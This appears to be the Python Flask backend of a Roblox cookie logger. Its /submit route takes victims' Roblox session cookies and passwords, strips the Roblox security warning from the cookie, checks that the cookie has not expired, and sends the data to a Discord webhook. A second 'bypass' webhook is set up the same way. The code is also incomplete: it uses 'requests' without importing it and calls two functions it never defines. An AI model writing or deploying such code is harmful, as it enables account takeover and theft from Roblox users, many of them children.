import os
import sys
import json
import re
import base64
import time
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")

def is_valid_cookie(cookie):
    """
    Validate cookie format and check if it's not expired
    Supports JWT tokens and basic session cookies with expiration validation
    Returns tuple: (is_valid, is_expired, error_message)
    """
    if not cookie or len(cookie) < 10:
        return False, False, "Invalid cookie format - too short"
    
    # Check if it's a JWT token (has 3 parts separated by dots)
    if cookie.count('.') == 2:
        try:
            # Split JWT token
            header, payload, signature = cookie.split('.')
            
            # Decode payload with correct padding for URL-safe base64
            payload += '=' * (-len(payload) % 4)
            decoded_payload = base64.urlsafe_b64decode(payload)
            payload_data = json.loads(decoded_payload)
            
            # Check expiration (exp claim)
            if 'exp' in payload_data:
                exp_time = payload_data['exp']
                current_time = int(time.time())
                
                if current_time >= exp_time:
                    return False, True, "JWT token has expired"
            
            return True, False, None  # Valid JWT token, not expired
            
        except (ValueError, json.JSONDecodeError, Exception):
            return False, False, "Invalid JWT token format"
    
    # Accept standard cookie formats (basic validation only)
    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
    if re.match(cookie_pattern, cookie):
        return True, False, None
    
    # Accept any reasonable length alphanumeric string
    if len(cookie) >= 20 and any(c.isalnum() for c in cookie):
        return True, False, None
    
    return False, False, "Cookie format not recognized"

@app.route('/')
def index():
    """Serve the main HTML page"""
    return send_from_directory('.', 'index.html')

@app.route('/health')
def health_check():
    """Health check endpoint to verify main webhook connectivity"""
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    
    if not webhook_url:
        return jsonify({
            'status': 'error',
            'message': 'DISCORD_WEBHOOK_URL not configured'
        }), 500
    
    # Validate webhook URL format
    if not webhook_url.startswith('https://discord.com/api/webhooks/'):
        return jsonify({
            'status': 'error', 
            'message': 'Invalid Discord webhook URL format'
        }), 500
    
    try:
        # Test connection with a minimal payload
        test_payload = {'content': 'Health check test'}
        response = requests.post(webhook_url, json=test_payload, timeout=5)
        
        if response.status_code in [200, 204]:
            return jsonify({
                'status': 'ok',
                'message': 'Discord webhook connection successful',
                'webhook_status': response.status_code
            })
        else:
            return jsonify({
                'status': 'error',
                'message': f'Discord webhook returned status {response.status_code}',
                'response': response.text[:200]
            }), 500
            
    except requests.ConnectionError as e:
        return jsonify({
            'status': 'error',
            'message': 'Connection error - cannot reach Discord servers',
            'error': str(e)[:100]
        }), 500
    except requests.Timeout:
        return jsonify({
            'status': 'error',
            'message': 'Timeout error - Discord servers not responding'
        }), 500
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Unexpected error: {str(e)[:100]}'
        }), 500

@app.route('/health/full')
def health_check_full():
    """Comprehensive health check for both main and bypass webhooks"""
    results = {
        'main_webhook': {'status': 'unknown'},
        'bypass_webhook': {'status': 'unknown'},
        'overall_status': 'unknown'
    }
    
    # Test main webhook
    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not main_webhook_url:
        results['main_webhook'] = {
            'status': 'error',
            'message': 'DISCORD_WEBHOOK_URL not configured'
        }
    else:
        try:
            test_payload = {'content': 'Main webhook health check'}
            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
            
            if response.status_code in [200, 204]:
                results['main_webhook'] = {
                    'status': 'ok',
                    'message': 'Main webhook successful',
                    'status_code': response.status_code
                }
            else:
                results['main_webhook'] = {
                    'status': 'error',
                    'message': f'Main webhook failed with status {response.status_code}',
                    'status_code': response.status_code
                }
        except Exception as e:
            results['main_webhook'] = {
                'status': 'error',
                'message': f'Main webhook error: {str(e)[:100]}'
            }
    
    # Test bypass webhook
    bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
    if not bypass_webhook_url:
        results['bypass_webhook'] = {
            'status': 'warning',
            'message': 'BYPASS_WEBHOOK_URL not configured - bypass logs will not work'
        }
    else:
        try:
            test_payload = {'content': 'Bypass webhook health check'}
            response = requests.post(bypass_webhook_url, json=test_payload, timeout=5)
            
            if response.status_code in [200, 204]:
                results['bypass_webhook'] = {
                    'status': 'ok',
                    'message': 'Bypass webhook successful',
                    'status_code': response.status_code
                }
            else:
                results['bypass_webhook'] = {
                    'status': 'error',
                    'message': f'Bypass webhook failed with status {response.status_code}',
                    'status_code': response.status_code
                }
        except Exception as e:
            results['bypass_webhook'] = {
                'status': 'error',
                'message': f'Bypass webhook error: {str(e)[:100]}'
            }
    
    # Determine overall status
    main_ok = results['main_webhook']['status'] == 'ok'
    bypass_ok_or_warning = results['bypass_webhook']['status'] in ['ok', 'warning']
    
    if main_ok and bypass_ok_or_warning:
        results['overall_status'] = 'ok'
        status_code = 200
    elif main_ok:
        results['overall_status'] = 'partial'
        status_code = 200
    else:
        results['overall_status'] = 'error'
        status_code = 500
    
    return jsonify(results), status_code

@app.route('/debug')
def debug_info():
    """Debug endpoint to check environment and configuration"""
    return jsonify({
        'environment_variables': {
            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
            'BYPASS_WEBHOOK_URL': 'SET' if os.environ.get('BYPASS_WEBHOOK_URL') else 'NOT_SET',
            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
        },
        'python_version': sys.version,
        'current_working_directory': os.getcwd(),
        'files_in_directory': os.listdir('.'),
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
    })


@app.route('/submit', methods=['POST'])
def submit_form():
    """Handle form submission and send to Discord webhook"""
    try:
        data = request.get_json()
        
        # Extract all form fields
        password = data.get('password', '').strip()
        korblox = data.get('korblox', False)
        headless = data.get('headless', False)
        cookie = data.get('cookie', '').strip()
        
        # Auto-clean Roblox warning prefix from cookie
        cookie = clean_roblox_cookie(cookie)
        
        # Server-side validation
        if not cookie:
            return jsonify({
                'success': False, 
                'message': 'Missing required field (cookie)'
            }), 400
        
        # Comprehensive cookie validation
        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
        
        if not is_valid or is_expired:
            return jsonify({
                'success': False, 
                'message': 'Your Cookie Was Expired Or Invalid'
            }), 400
        
        
        # Get Discord webhook URL from environment
        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
        if not webhook_url:
            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
            return jsonify({
                'success': False, 
                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
            }), 500
        
        print("Discord webhook URL configured successfully") # Don't log URL for security
        
        # Process Discord webhooks synchronously for Vercel compatibility  
        print("Processing Discord webhooks synchronously...")
        start_time = time.time()
        
        try:
            send_to_discord_background(password, korblox, headless, cookie, webhook_url)
            end_time = time.time()
            processing_time = end_time - start_time
            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
            
            return jsonify({
                'success': True, 
                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
            })
        except Exception as e:
            end_time = time.time()
            processing_time = end_time - start_time
            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
            return jsonify({
                'success': False, 
                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
            }), 500
            
    except Exception as e:
        return jsonify({
            'success': False, 
            'message': 'Server error occurred'
        }), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)